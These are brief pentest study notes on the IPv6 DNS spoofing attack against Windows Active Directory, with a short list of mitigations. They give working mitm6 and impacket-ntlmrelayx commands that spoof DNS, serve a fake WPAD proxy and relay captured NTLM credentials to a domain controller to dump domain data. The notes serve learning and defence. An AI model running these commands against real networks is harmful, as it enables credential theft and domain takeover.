# IPv6 DNS Attack

All Windows machines default to having IPv6 available. However, not all networks are set up for it - meaning they don't have an IPv6 DNS server. 

IPv6 Spoofing is when an attacker performs a Man-in-the-middle attack ([see tool](https://github.com/dirkjanm/mitm6/tree/master))  to spoof a IPv6 DNS server. 

As simple as: `mitm6 -d <AD domain>`

Then we can use `impacket-ntlmrelay` to host a fake WPAD server to reply to IPv6 broadcasts, then take the Window client's credentials and use them to gain access to AD DS.

In a seperate terminal (while running the above `mitm6` attack)

`impacket-ntlmrelayx -6 -t ldaps://<DOMAIN CONTROLLER IP> -wh fakewpad.<DOMAIN NAME>.local -l <dir loot output files>`

`-6` means we're listening for IPv6

`-t ldaps://<DOMAIN CONTROLLER IP>` is the Domain Controller we are trying to gain creds to

`-l <dir of loot output files>`  domain info in html, json, and grep formats


# Mitigations

1) If not using IPv6 - then set Group Polocy to disable IPv6 traffic (like DHCPv6)
2) If WPAD is not used - disable Group Policy
3) LDAP[s] relaying can me mitigated by LDAP signing an LDAP channel binding
4) Disable delegation

These notes are based off of https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
